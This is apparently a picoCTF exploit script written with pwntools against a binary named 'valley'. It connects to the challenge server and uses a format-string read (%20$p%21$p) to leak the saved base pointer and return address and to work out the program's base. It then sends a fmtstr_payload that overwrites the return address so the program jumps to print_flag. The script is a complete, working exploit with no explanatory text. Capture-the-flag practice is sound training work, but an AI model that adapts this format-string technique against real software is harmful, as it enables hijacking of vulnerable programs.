from pwn import *

context.binary = elf = ELF('./valley')

#pr = process()
pr = remote('shape-facility.picoctf.net', 59045)
pr.recvuntil(b'Shouting: \n')
pr.sendline(b'%20$p%21$p')
pr.recvuntil(b'distance: ')
leak = pr.recvline().strip().split(b'0x')
print(leak)

rbp = int(leak[1], 16)
rip = int(leak[2], 16)
elf.address = rip - elf.sym['main'] - 18
fmt_str = fmtstr_payload(6, writes={rbp-8: elf.sym['print_flag']},write_size='short')
print(len(fmt_str))
pr.sendline(fmt_str)
pr.sendline(b'exit')
pr.interactive()